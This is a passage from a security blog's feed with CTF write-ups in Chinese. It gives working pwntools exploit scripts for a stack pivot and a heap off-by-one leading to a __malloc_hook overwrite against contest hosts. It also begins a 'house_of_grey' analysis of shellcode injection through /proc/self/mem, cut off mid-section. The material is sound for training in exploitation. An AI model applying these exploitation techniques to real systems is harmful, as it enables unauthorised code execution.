    <link href="https://cv196082.gitee.io/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/"/>
    <id>https://cv196082.gitee.io/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/</id>
    <published>2022-01-08T13:19:36.000Z</published>
    <updated>2022-01-08T13:26:11.949Z</updated>
    
    <content type="html"><![CDATA[<p>总的来说比赛挺简单的，因为pwn2没遇到过所以调试花费的时间比较多，没来的及做pwn3，不过pwn3看了好像是存在任意地址写漏洞，猜测是修改exit的got表之类的，后面复现了再发(当然有可能因为太懒不发了)。</p><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add esp, 10h</span><br><span class="line">mov eax, 0</span><br><span class="line">mov ecx, [ebp+var_4]</span><br><span class="line">leave</span><br><span class="line">lea esp,[ecx-4]</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>注意程序不是从原本的位置开始ret就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./pwn1&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;113.201.14.253&#x27;</span>, <span class="number">16088</span>)</span><br><span class="line"></span><br><span class="line">shell_addr = <span class="number">0x8048540</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Gift:&#x27;</span>)</span><br><span class="line">buf_addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)[<span class="number">2</span>:], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x38</span>-<span class="number">0x4</span>)+p32(buf_addr+<span class="number">0x38</span>+<span class="number">8</span>)+p32(<span class="number">0</span>)+p32(shell_addr)</span><br><span class="line"><span class="comment"># r.sendline(b&#x27;a&#x27;*(0x38+0x4))</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><h3 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off by one"></a>off by one</h3><p>程序在create的时候存在off by one漏洞，具体思路，覆盖下方chunk，释放chunk进入unsortedbin泄漏main_arena，释放chunk进入tcache修改到malloc上面的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./pwn2&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;113.201.14.253&#x27;</span>, <span class="number">16066</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">one_gadget = <span class="number">0x10a41c</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;size: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(size), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;idx: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">id</span>), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;idx: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">id</span>), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;idx: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">id</span>), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>)    <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)  <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x68</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>)    <span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0x88</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>)    <span class="comment"># 3</span></span><br><span class="line">create(<span class="number">0xf8</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf8</span>)    <span class="comment"># 4</span></span><br><span class="line">create(<span class="number">0x88</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>)    <span class="comment"># 5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># delete(9)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x68</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x68</span>-<span class="number">0x8</span>)+p64(<span class="number">0</span>)+<span class="string">b&#x27;\x80&#x27;</span>)  <span class="comment"># 0</span></span><br><span class="line"><span class="comment"># 让chunk1覆盖掉chunk2</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x170</span>, <span class="string">b&#x27;a&#x27;</span>)  <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">create(<span class="number">0x88</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>-<span class="number">0x8</span>)+p64(<span class="number">0</span>)+<span class="string">b&#x27;\x90&#x27;</span>)  <span class="comment"># 3</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># chunk4覆盖掉chunk5</span></span><br><span class="line">create(<span class="number">0x180</span>, <span class="string">b&#x27;a&#x27;</span>)  <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    create(<span class="number">0x88</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(<span class="number">12</span>-i)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"><span class="comment"># 让chunk5进入unsortedbin获得main_arena地址</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xf8</span>+<span class="number">0x8</span>-<span class="number">1</span>))</span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;aaaaaaaaaaaaaa\n&#x27;</span>)</span><br><span class="line">main_arena_88 = u64(r.recvuntil(<span class="string">b&#x27;1.Add&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena_88))</span><br><span class="line">malloc_hook = (main_arena_88 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + \</span><br><span class="line">    (libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] &amp; <span class="number">0xfff</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">libc_base = malloc_hook-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">one_gadget = libc_base+one_gadget</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x70</span>)+p64(malloc_hook-<span class="number">0x10</span>))  <span class="comment"># 2</span></span><br><span class="line"><span class="comment"># 释放chunk2，进入tcache，修改fd指针</span></span><br><span class="line">create(<span class="number">0x68</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">create(<span class="number">0x68</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(one_gadget))</span><br><span class="line"><span class="comment"># 修改malloc_hook</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Choice: &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;size: &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment"># getshell</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>自己还是在常见的漏洞上面出现问题比如这次的off by one还有off by null都还没去了解，所以下来会去了解这方面的漏洞原理和利用方式。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;总的来说比赛挺简单的，因为pwn2没遇到过所以调试花费的时间比较多，没来的及做pwn3，不过pwn3看了好像是存在任意地址写漏洞，猜测是修改exit的got表之类的，后面复现了再发(当然有可能因为太懒不发了)。&lt;/p&gt;
&lt;h2 id=&quot;pwn1&quot;&gt;&lt;a href=&quot;#pwn</summary>
      
    
    
    
    <category term="比赛wp" scheme="https://cv196082.gitee.io/categories/%E6%AF%94%E8%B5%9Bwp/"/>
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>house_of_grey</title>
    <link href="https://cv196082.gitee.io/2022/01/05/house-of-grey/"/>
    <id>https://cv196082.gitee.io/2022/01/05/house-of-grey/</id>
    <published>2022-01-05T04:31:22.000Z</published>
    <updated>2022-01-05T05:13:55.532Z</updated>
    
    <content type="html"><![CDATA[<h3 id="proc"><a href="#proc" class="headerlink" title="/proc"></a>/proc</h3><p>Linux 内核提供了一种通过 /proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。读取/proc/self/maps可以得到当前进程的内存映射关系，通过读该文件的内容可以得到内存代码段基址。/proc/self/mem是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存。该文件不能直接读取，需要结合maps的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。<br>同样的，我们也可以通过写入mem文件来直接写入内存，例如直接修改代码段，放入我们的shellcode，从而在程序流程执行到这一步时执行shellcode来拿shell。<img src="/images/image-20220105123349595.png" alt="image-20220105123349595"></p><p>可以看到效果类似与gdb的vmmap。</p><h3 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h3><p><img src="/images/image-20220105123705542.png" alt="image-20220105123705542"></p><p>保护全开</p><h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+1Bh] [rbp-25h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> stat_loc; <span class="comment">// [rsp+1Ch] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">__pid_t</span> pid; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_F35(a1, a2, a3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to my house! Enjoy yourself!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you want to help me build my room? Y/n?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( buf == <span class="number">121</span> || buf == <span class="number">89</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    read(fd, &amp;v7, <span class="number">8uLL</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">    v7 &amp;= <span class="number">0xFFFFF0</span>u;</span><br><span class="line">    v8 = (<span class="keyword">char</span> *)mmap(<span class="number">0LL</span>, <span class="number">0x10000000</span>uLL, <span class="number">3</span>, <span class="number">131106</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v8 == (<span class="keyword">char</span> *)<span class="number">-1LL</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    pid = clone(fn, &amp;v8[v7], <span class="number">256</span>, <span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( pid == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;clone&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    waitpid(pid, &amp;stat_loc, <span class="number">0x80000000</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (stat_loc &amp; <span class="number">0x7F</span>) != <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\nMaybe something wrong? Build failed!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\nBuild finished! Thanks a lot!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You don&#x27;t help me? OK, just get out of my hosue!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是创建映射，然后将将映射的随机部分当作fn函数的堆栈区</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">fn</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-64h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-64h]</span></span><br><span class="line">  <span class="keyword">void</span> *v6; <span class="comment">// [rsp+20h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+30h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="keyword">void</span> *v8; <span class="comment">// [rsp+48h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> nptr[<span class="number">40</span>]; <span class="comment">// [rsp+50h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You get into my room. Just find something!\n&quot;</span>);</span><br><span class="line">  v6 = <span class="built_in">malloc</span>(<span class="number">0x186A0</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;malloc&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_14D2() )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  v8 = v6;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">29</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_FEE() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;So man, what are you finding?&quot;</span>);</span><br><span class="line">        buf[(<span class="keyword">int</span>)(read(<span class="number">0</span>, buf, <span class="number">0x28</span>uLL) - <span class="number">1</span>)] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_FA6(buf) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Man, don&#x27;t do it! See you^.&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        fd = open(buf, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;So, Where are you?&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, nptr, <span class="number">0x20</span>uLL);</span><br><span class="line">        v1 = strtoull(nptr, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">        lseek(fd, v1, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;How many things do you want to get?&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, nptr, <span class="number">8uLL</span>);</span><br><span class="line">        v4 = atoi(nptr);</span><br><span class="line">        <span class="keyword">if</span> ( v4 &lt;= <span class="number">100000</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = read(fd, v8, v4);</span><br><span class="line">          <span class="keyword">if</span> ( v5 &lt; <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;error read&quot;</span>);</span><br><span class="line">            perror(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;You get something:&quot;</span>);</span><br><span class="line">          write(<span class="number">1</span>, v8, v5);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;You greedy man!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;What do you want to give me?&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, v8, <span class="number">0x200</span>uLL);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nI guess you don&#x27;t want to say Goodbye!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;But sadly, bye! Hope you come again!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里四个功能就是，第一个：输入要读的文件名，第二个：改变便宜指针，第三个：获取文件内容，第四个：输入数据</p><p>漏洞：buf存在缓冲区溢出可以覆盖v8指针导致任意地址写</p><h3 id="利用分析"><a href="#利用分析" class="headerlink" 